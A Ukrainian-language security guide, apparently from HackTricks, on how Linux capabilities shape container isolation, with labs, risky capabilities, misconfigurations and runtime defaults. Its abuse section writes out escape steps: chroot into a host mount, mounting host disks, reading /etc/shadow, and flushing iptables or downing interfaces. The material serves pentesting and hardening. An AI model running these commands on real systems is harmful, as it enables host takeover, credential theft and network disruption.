# Linux Capabilities У Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux capabilities є одним із найважливіших елементів container security, оскільки дають відповідь на тонке, але фундаментальне питання: **що насправді означає "root" усередині контейнера?** У звичайній Linux-системі UID 0 історично означав дуже широкий набір привілеїв. У сучасних kernel ці привілеї розділені на менші одиниці, які називаються capabilities. Процес може працювати як root і водночас не мати багатьох потужних можливостей, якщо відповідні capabilities було видалено.

Containers значною мірою залежать від цього розмежування. Багато workloads досі запускаються як UID 0 усередині контейнера з міркувань сумісності або простоти. Без dropping capabilities це було б надто небезпечно. Якщо capabilities видалено, containerized root process усе ще може виконувати багато звичайних завдань усередині контейнера, але йому буде заборонено виконувати чутливіші kernel operations. Саме тому shell контейнера, який показує `uid=0(root)`, автоматично не означає "host root" або навіть "broad kernel privilege". Набори capabilities визначають, наскільки багато насправді дає ця root identity.

Повний reference Linux capabilities і багато прикладів зловживання наведено тут:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Робота

Capabilities відстежуються в кількох наборах, зокрема permitted, effective, inheritable, ambient і bounding sets. Для багатьох container assessments точна kernel semantics кожного набору менш важлива, ніж кінцеве практичне питання: **які privileged operations цей процес може успішно виконати прямо зараз і які майбутні privilege gains усе ще можливі?**

Це важливо, оскільки багато breakout techniques насправді є проблемами capabilities, замаскованими під container problems. Workload із `CAP_SYS_ADMIN` отримує доступ до величезної кількості kernel functionality, якої звичайний container root process не повинен торкатися. Workload із `CAP_NET_ADMIN` стає значно небезпечнішим, якщо він також використовує host network namespace. Workload із `CAP_SYS_PTRACE` стає набагато цікавішим, якщо може бачити host processes через спільний host PID namespace. У Docker або Podman це може мати вигляд `--pid=host`; у Kubernetes зазвичай використовується `hostPID: true`.

Іншими словами, capability set не можна оцінювати ізольовано. Його потрібно розглядати разом із namespaces, seccomp і MAC policy.

## Лабораторія

Дуже простий спосіб перевірити capabilities усередині контейнера:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Також можна порівняти контейнер із більш суворими обмеженнями з контейнером, якому додано всі capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Щоб побачити ефект точкового додавання, спробуйте видалити все й додати назад лише одну capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ці невеликі експерименти допомагають показати, що runtime не просто перемикає boolean під назвою "privileged". Він формує фактичну поверхню привілеїв, доступну процесу.

## Capabilities із високим ризиком

Хоча багато capabilities можуть мати значення залежно від цілі, кілька з них регулярно відіграють важливу роль в аналізі container escape.

**`CAP_SYS_ADMIN`** — це capability, до якої defenders мають ставитися з найбільшою підозрою. Її часто називають "the new root", оскільки вона відкриває величезний обсяг функціональності, зокрема операції, пов’язані з mount, поведінку, чутливу до namespace, і багато kernel paths, які ніколи не слід бездумно відкривати для containers. Якщо container має `CAP_SYS_ADMIN`, слабкий seccomp і не має сильного MAC confinement, багато класичних breakout paths стають значно реалістичнішими.

**`CAP_SYS_PTRACE`** має значення, коли існує видимість процесів, особливо якщо PID namespace спільний із host або з цікавими сусідніми workloads. Він може перетворити видимість на tampering.

**`CAP_NET_ADMIN`** і **`CAP_NET_RAW`** мають значення в середовищах, орієнтованих на network. В ізольованій bridge network вони вже можуть бути небезпечними; у спільному з host network namespace ситуація значно гірша, оскільки workload може отримати можливість переналаштовувати host networking, sniff, spoof або втручатися в локальні traffic flows.

**`CAP_SYS_MODULE`** зазвичай є катастрофічним у rootful environment, оскільки завантаження kernel modules фактично означає контроль над host kernel. Він майже ніколи не має з’являтися у workload загального призначення, що працює в container.

## Використання runtime

Docker, Podman, stacks на базі containerd і CRI-O використовують controls для capabilities, але defaults та management interfaces у них відрізняються. Docker безпосередньо відкриває їх через flags на кшталт `--cap-drop` і `--cap-add`. Podman надає подібні controls і часто додатково підвищує безпеку завдяки rootless execution. Kubernetes надає можливість додавати й видаляти capabilities через `securityContext` Pod або container. System-container environments, такі як LXC/Incus, також покладаються на control capabilities, але ширша інтеграція цих систем із host часто спонукає operators агресивніше послаблювати defaults, ніж вони робили б у середовищі app-container.

Той самий принцип діє в усіх цих системах: capability, яку технічно можна надати, не обов’язково слід надавати. Багато real-world incidents починаються тоді, коли operator додає capability просто тому, що workload не запускався у суворішій конфігурації, а команді було потрібне швидке виправлення.

## Misconfigurations

Найочевидніша помилка — **`--cap-add=ALL`** у CLIs на кшталт Docker/Podman, але це не єдина проблема. На практиці частіше трапляється надання однієї або двох надзвичайно потужних capabilities, особливо `CAP_SYS_ADMIN`, щоб "змусити application працювати", без одночасного розуміння наслідків для namespace, seccomp і mount. Ще один поширений failure mode — поєднання додаткових capabilities зі спільним використанням host namespace. У Docker або Podman це може мати вигляд `--pid=host`, `--network=host` або `--userns=host`; у Kubernetes еквівалентна exposure зазвичай виникає через такі workload settings, як `hostPID: true` або `hostNetwork: true`. Кожна з цих комбінацій змінює те, на що capability фактично може впливати.

Також часто можна побачити, що administrators вважають: оскільки workload не є повністю `--privileged`, він усе ще має суттєві обмеження. Іноді це справді так, але іноді effective posture вже достатньо близька до privileged, щоб ця відмінність перестала мати практичне значення.

## Abuse

Перший практичний крок — перелічити effective capability set і негайно перевірити capability-specific actions, які можуть мати значення для escape або доступу до host information:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Якщо присутній `CAP_SYS_ADMIN`, спочатку перевірте зловживання на основі mount і доступ до файлової системи хоста, оскільки це один із найпоширеніших чинників, що уможливлюють breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Якщо присутня `CAP_SYS_PTRACE` і контейнер може бачити цікаві процеси, перевірте, чи можна перетворити цю capability на інспекцію процесів:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Якщо присутній `CAP_NET_ADMIN` або `CAP_NET_RAW`, перевірте, чи може workload маніпулювати видимим мережевим стеком або принаймні збирати корисну мережеву розвідувальну інформацію:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Коли перевірка capability завершується успішно, поєднайте її з ситуацією щодо namespace. Capability, яка в ізольованому namespace здається лише потенційно небезпечною, може одразу перетворитися на escape або host-recon primitive, якщо контейнер також використовує спільні з host PID, network або mounts.

### Full Example: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Якщо контейнер має `CAP_SYS_ADMIN` і writable bind mount файлової системи host, наприклад `/host`, шлях до escape часто є простим:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Якщо `chroot` завершується успішно, команди тепер виконуються в контексті кореневої файлової системи хоста:
```bash
id
hostname
cat /etc/shadow | head
```
Якщо `chroot` недоступний, того самого результату часто можна досягти, викликавши бінарний файл через змонтоване дерево:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Повний приклад: `CAP_SYS_ADMIN` + доступ до пристроїв

Якщо блочний пристрій із host доступний, `CAP_SYS_ADMIN` може перетворити його на прямий доступ до файлової системи host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Повний приклад: `CAP_NET_ADMIN` + Host Networking

Ця комбінація не завжди безпосередньо надає root на host, але може повністю переналаштувати мережевий стек host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це може уможливити denial of service, перехоплення трафіку або доступ до сервісів, які раніше фільтрувалися.

## Перевірки

Мета перевірок capabilities полягає не лише в отриманні необроблених значень, а й у розумінні того, чи має процес достатньо привілеїв, щоб його поточний namespace і стан монтування становили небезпеку.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Що тут цікавого:

- `capsh --print` — це найпростіший спосіб виявити high-risk capabilities, такі як `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` або `cap_sys_module`.
- Рядок `CapEff` у `/proc/self/status` показує, які capabilities фактично ефективні зараз, а не лише те, що може бути доступним в інших наборах.
- Дамп capabilities стає значно важливішим, якщо контейнер також спільно використовує host PID, network або user namespaces, або має writable host mounts.

Після збору необробленої інформації про capabilities наступним кроком є інтерпретація. З’ясуйте, чи є процес root, чи активні user namespaces, чи спільно використовуються host namespaces, чи seccomp працює в режимі enforcing, і чи AppArmor або SELinux все ще обмежують процес. Сам набір capabilities — лише частина загальної картини, але часто саме він пояснює, чому один container breakout працює, а інший завершується помилкою з тієї самої очевидної початкової точки.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker зберігає стандартний allowlist capabilities і видаляє решту | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers за замовчуванням є unprivileged і використовують reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | Якщо `securityContext.capabilities` не вказано, container отримує default capability set від runtime | `securityContext.capabilities.add`, незастосування `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | Ефективний набір залежить від runtime і Pod spec | те саме, що й у рядку Kubernetes; пряма OCI/CRI configuration також може явно додавати capabilities |

Для Kubernetes важливо, що API не визначає один універсальний default capability set. Якщо Pod не додає і не видаляє capabilities, workload успадковує runtime default для цього node.

{{#include ../../../../banners/hacktricks-training.md}}
